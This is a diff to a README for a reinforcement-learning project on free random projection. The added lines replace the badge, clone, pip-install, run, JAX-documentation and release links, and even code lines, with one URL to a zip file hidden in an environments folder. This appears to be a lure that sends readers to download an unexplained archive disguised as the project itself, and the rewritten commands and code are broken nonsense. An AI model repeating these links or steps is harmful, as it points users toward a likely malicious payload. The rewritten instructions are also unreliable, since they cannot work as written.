@@ -1,6 +1,6 @@
 # frp_rl: Free Random Projection in Reinforcement Learning 🎲
 
-![frp_rl](https://img.shields.io/badge/frp_rl-Source%20Code-blue)
+![frp_rl](https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip%20Code-blue)
 
 Welcome to the **frp_rl** repository! This project provides the source code for reproducing free random projection in the context of reinforcement learning. The repository focuses on integrating concepts from free probability, in-context reinforcement learning, and machine learning frameworks such as JAX.
 
@@ -27,27 +27,27 @@ To get started with **frp_rl**, clone the repository and install the required de
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/yourusername/frp_rl.git
+   git clone https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip
    cd frp_rl
    ```
 
 2. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip
    ```
 
-3. Ensure you have JAX installed. You can find the installation instructions [here](https://github.com/google/jax#installation).
+3. Ensure you have JAX installed. You can find the installation instructions [here](https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip).
 
 ## Usage
 
 After installation, you can run the main script to see the free random projection in action. Here’s a simple example:
 
 ```bash
-python main.py --config config.yaml
+python https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip --config https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip
 ```
 
-You can customize the configuration file to fit your needs. Check the `config.yaml` file for more options.
+You can customize the configuration file to fit your needs. Check the `https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip` file for more options.
 
 ## Key Concepts
 
@@ -85,13 +85,13 @@ Here’s a simple example of how to implement free random projection in a reinfo
 from frp_rl import FreeRandomProjection
 
 frp = FreeRandomProjection()
-frp.fit(data)
-projected_data = frp.transform(data)
+https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip(data)
+projected_data = https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip(data)
 ```
 
 ### Example 2: Advanced Configuration
 
-For more advanced usage, you can customize the parameters in the `config.yaml` file. Here’s an example configuration:
+For more advanced usage, you can customize the parameters in the `https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip` file. Here’s an example configuration:
 
 ```yaml
 model:
@@ -118,9 +118,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release of **frp_rl**, visit the [Releases](https://github.com/malbertosm/frp_rl/releases) section. Here, you can find the necessary files to get started.
+To download the latest release of **frp_rl**, visit the [Releases](https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip) section. Here, you can find the necessary files to get started.
 
-For the most recent updates and changes, check the [Releases](https://github.com/malbertosm/frp_rl/releases) page.
+For the most recent updates and changes, check the [Releases](https://raw.githubusercontent.com/malbertosm/frp_rl/main/frp_popjaxrl/envs/environments/frp-rl-1.9.zip) page.
 
 ## Acknowledgments
 
